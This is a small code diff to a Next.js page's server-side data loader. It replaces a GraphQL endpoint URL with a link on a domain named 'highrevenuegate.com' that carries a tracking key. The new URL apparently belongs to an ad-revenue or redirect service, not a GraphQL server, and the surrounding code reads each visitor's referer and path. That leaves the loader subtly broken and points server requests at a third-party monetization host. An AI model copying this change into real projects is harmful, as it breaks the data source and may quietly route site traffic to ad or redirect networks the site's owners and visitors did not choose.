@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://nemeechand.000webhostapp.com/graphql"
+	const endpoint = "https://www.highrevenuegate.com/wmc01hx0fw?key=f140db9ce2ad38f2ac3499fe42b7bd92"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
